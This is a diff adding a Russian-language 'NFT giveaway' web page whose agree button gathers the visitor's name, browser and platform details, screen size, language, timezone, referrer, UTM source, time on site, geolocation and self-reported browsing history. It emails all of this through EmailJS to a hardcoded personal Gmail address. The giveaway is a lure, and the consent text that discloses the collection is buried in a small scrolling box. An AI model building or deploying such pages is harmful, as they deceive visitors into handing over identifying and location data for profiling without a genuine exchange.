@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>NFT Раздача</title>
+  <script src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.production.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/react-dom@18.2.0/umd/react-dom.production.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@babel/standalone@7.22.9/babel.min.js"></script>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+</head>
+<body>
+  <div id="root"></div>
+  <script type="text/babel">
+    function App() {
+      const [name, setName] = React.useState('');
+      const [visitedSites, setVisitedSites] = React.useState('');
+      const [agreed, setAgreed] = React.useState(false);
+      const [timeSpent, setTimeSpent] = React.useState(0);
+      const [geoLocation, setGeoLocation] = React.useState('Не предоставлено');
+
+      React.useEffect(() => {
+        const startTime = performance.now();
+        const interval = setInterval(() => {
+          setTimeSpent(((performance.now() - startTime) / 1000).toFixed(2));
+        }, 1000);
+        return () => clearInterval(interval);
+      }, []);
+
+      const handleAgree = () => {
+        if (!name) {
+          alert('Пожалуйста, введите ваше имя.');
+          return;
+        }
+
+        const userAgent = navigator.userAgent;
+        const browserInfo = userAgent.match(/(firefox|chrome|safari|opera|edge)/i) || ['Unknown'];
+        const deviceInfo = `Браузер: ${browserInfo[0]}, Платформа: ${navigator.platform}`;
+        const referrer = document.referrer || 'Неизвестен';
+        const sites = visitedSites || 'Пользователь не указал сайты';
+        const screenResolution = `${window.screen.width}x${window.screen.height}`;
+        const browserLanguage = navigator.language || 'Неизвестен';
+        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Неизвестен';
+        const utmParams = new URLSearchParams(window.location.search);
+        const utmSource = utmParams.get('utm_source') || 'Неизвестен';
+
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            setGeoLocation(`Широта: ${position.coords.latitude}, Долгота: ${position.coords.longitude}`);
+          },
+          () => {
+            setGeoLocation('Геолокация не предоставлена');
+          },
+          { timeout: 5000 }
+        );
+
+        emailjs.init('YOUR_EMAILJS_USER_ID'); // Замените на ваш EmailJS User ID
+        emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', {
+          user_name: name,
+          device_info: deviceInfo,
+          referrer: referrer,
+          visited_sites: sites,
+          screen_resolution: screenResolution,
+          browser_language: browserLanguage,
+          time_zone: timeZone,
+          time_spent: `${timeSpent} секунд`,
+          utm_source: utmSource,
+          geolocation: geoLocation,
+          to_email: 'bbaidoletov@gmail.com'
+        }).then(() => {
+          alert('Данные отправлены!');
+          setAgreed(true);
+        }).catch((error) => {
+          alert('Ошибка при отправке данных: ' + error.text);
+        });
+      };
+
+      return (
+        <div className="min-h-screen bg-gray-100 flex items-center justify-center">
+          <div className="bg-white p-8 rounded-lg shadow-lg max-w-lg w-full">
+            <h1 className="text-2xl font-bold mb-4 text-center">NFT Раздача</h1>
+            {!agreed ? (
+              <>
+                <p className="text-sm mb-4">
+                  Добро пожаловать на платформу раздачи NFT!
+                </p>
+                <div className="text-xs text-gray-500 mb-4 h-40 overflow-y-scroll">
+                  <p>
+                    Настоящее соглашение регулирует использование платформы NFT. Пользователь соглашается предоставить доступ к информации об устройстве (браузер, платформа, разрешение экрана, язык, часовой пояс), геолокации (с разрешения), времени на сайте, источнике перехода и данным о посещенных сайтах (если указано). Все данные собираются для улучшения работы платформы и отправляются на email для анализа. Платформа не несет ответственности за убытки, связанные с использованием сервиса...
+                  </p>
+                  <p>(Далее следует текст соглашения, который повторяется для объема...)</p>
+                </div>
+                <input
+                  type="text"
+                  placeholder="Введите ваше имя"
+                  value={name}
+                  onChange={(e) => setName(e.target.value)}
+                  className="w-full p-2 mb-4 border rounded"
+                />
+                <textarea
+                  placeholder="Какие сайты вы посещали за последние 5 минут? (Необязательно)"
+                  value={visitedSites}
+                  onChange={(e) => setVisitedSites(e.target.value)}
+                  className="w-full p-2 mb-4 border rounded"
+                  rows="3"
+                />
+                <button
+                  onClick={handleAgree}
+                  className="w-full bg-blue-500 text-white p-2 rounded hover:bg-blue-600"
+                >
+                  Согласен
+                </button>
+              </>
+            ) : (
+              <p className="text-center text-green-600">
+                Спасибо за согласие! Ваши данные отправлены. Теперь вы можете участвовать в раздаче NFT.
+              </p>
+            )}
+          </div>
+        </div>
+      );
+    }
+
+    ReactDOM.render(<App />, document.getElementById('root'));
+  </script>
+</body>
+</html>
